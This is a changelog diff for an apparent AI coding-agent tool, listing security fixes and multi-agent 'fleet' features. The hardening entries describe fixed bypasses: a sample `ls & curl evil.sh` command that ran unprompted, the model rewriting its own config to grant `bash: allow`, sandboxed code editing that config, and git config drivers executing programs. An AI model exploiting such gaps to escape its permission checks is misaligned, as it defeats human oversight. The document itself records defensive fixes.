@@ -2,6 +2,25 @@
 
 ## Unreleased
 
+### Security hardening (round 2)
+
+- **Fix (critical):** a single `&` was not treated as a command separator, so `ls & curl evil.sh` ran without asking. The splitter is now quote-aware and fails safe (unterminated quotes, `$'…'`, substitutions, redirects always ask).
+- **Fix (critical):** the model could rewrite `<studio dir>/config.json` through the virtual `.studio/` path (default `edit: allow`) and set `bash: allow`. New `lib/protect.js` blocks the studio config/hooks/plugins/history, `<project>/.studio|.claude|.agents/plugins` and everything under `.git` for the file tools (symlinks resolved).
+- **Fix:** `git status/diff/log` were auto-allowed although `core.fsmonitor`, `diff.external`, textconv and filter drivers in `.git/config` execute programs. `lib/gitsafe.js` downgrades git commands to *ask* while such config is present.
+- **Fix (critical):** the Docker sandbox mounted the studio folder read-write, letting sandboxed code edit `config.json`. It is now opt-in (`mountStudio`, read-only); `.git/config`, `.git/hooks` and plugin folders are read-only inside the container.
+- **Change:** sandbox drops all capabilities (`capDrop`) and runs as the calling user on POSIX hosts (no root-owned files); a successful Docker check is cached for 60 s.
+- **Fix:** a malformed cookie made the request guard throw and the request hang. Cookie parsing is safe and a guard failure answers 400.
+- **Change:** "always allow" for interpreters/wrappers (`node`, `python`, `env`, `find`, `xargs`, `sed` …) and risky subcommands (`git push`, `docker run`, `npm run` …) now remembers the exact command only (literal grant, never a glob).
+
+### Fleets
+
+- **Fix:** a handoff to a busy agent was silently lost. It is now parked in the member's `pending` list (persisted, max 20) and delivered merged when that agent finishes.
+- **Fix:** aborting a run no longer triggers `on: any` links (`any` = done or failed); new `on: aborted` link type. An aborted member's parked handoffs are discarded with a visible `lastError`.
+- **New:** `fleet.maxChainRuns` (default 12): at most that many model runs per dispatched task, whatever the link graph looks like.
+- **New:** path claims between agents running at the same time (`lib/locks.js`): the first agent that changes a file owns it until its run ends. Without per-agent git worktrees this prevents silent overwrites.
+- **Fix:** a damaged `fleets.json` is copied to `fleets.json.broken` instead of being overwritten by the next save.
+- UI: handoff condition `when done or failed` / `when aborted`; member cards show waiting handoffs.
+
 - **New:** skills are auto-shortlisted by relevance, with `skills.auto` controls and frontmatter `auto: false`; hidden extended skills can be loaded from disk via `skills.remotesPath` or embedded with `--with-remotes`, and local names win.
 - **New:** the message menu has a **Select text** action for touch devices, enabling native selection/copy of one message without suppressing the long-press menu elsewhere.
 - **New:** bundled operational agents and skills are available by default with scoped delegation rules.
